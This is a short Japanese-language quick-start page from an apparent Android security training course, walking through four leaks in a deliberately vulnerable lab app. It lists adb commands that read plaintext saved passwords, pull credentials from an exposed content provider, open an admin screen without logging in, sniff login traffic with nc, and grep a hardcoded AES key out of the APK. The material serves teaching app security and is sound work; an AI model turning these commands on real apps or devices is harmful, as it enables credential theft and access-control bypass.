5分クイックチェック

4つの境界を1コマンドずつ破って、全体像だけ先に掴む

これは Basic 層の最短経路
ここでやるのは「漏れることの確認」だけ。なぜ普段は漏れないのかは各章の Standard 層で扱う。時間がないときの入口として使うこと。

前提：環境構築が済んでいて、 アプリの第1章画面で Username / Password を1回保存してあること。

1. プロセス境界 — 保存されたものを覗く

adb shell run-as com.example.insecureappplatform \
  cat shared_prefs/user_session.xml

パスワードが平文で出れば確認完了。→ 第1章へ

2. IPC境界 — 窓口から同じものを取る

adb shell content query --uri content://com.example.insecureappplatform.session/creds

同じ認証情報が、ファイル権限を一切越えずに取れる。→ 第2章へ

ついでに、ログインを飛ばして管理画面を開く。

adb shell am start -n com.example.insecureappplatform/.AdminActivity

3. ネットワーク境界 — 経路に流れるものを見る

# ホスト側で待ち受ける
nc -l 8080

この状態でアプリの第3章画面の 「1. HTTP で送る」 を押す。 POST /login と username=...&password=... がそのまま出れば確認完了。 → 第3章へ

4. Android Keystoreと鍵の使用 — 鍵を拾う

adb shell pm path com.example.insecureappplatform
adb pull /data/app/.../base.apk
unzip -p base.apk 'classes*.dex' | strings | grep -iE "1234567890abcdef|AES/ECB"

鍵と暗号モードがそのまま出れば確認完了。→ 第4章へ

まとめ

境界コマンド数目安
1. プロセス1< 1分
2. IPC2約1分
3. ネットワーク1 (+ アプリ操作)約1分
4. 鍵の使用3約2分
ここで止まらないこと
4つとも「漏れた」で終わっている。この教材の本体は、 なぜ普段は漏れないのかと防御はどこまで効くのかを確かめる Standard 層にある。
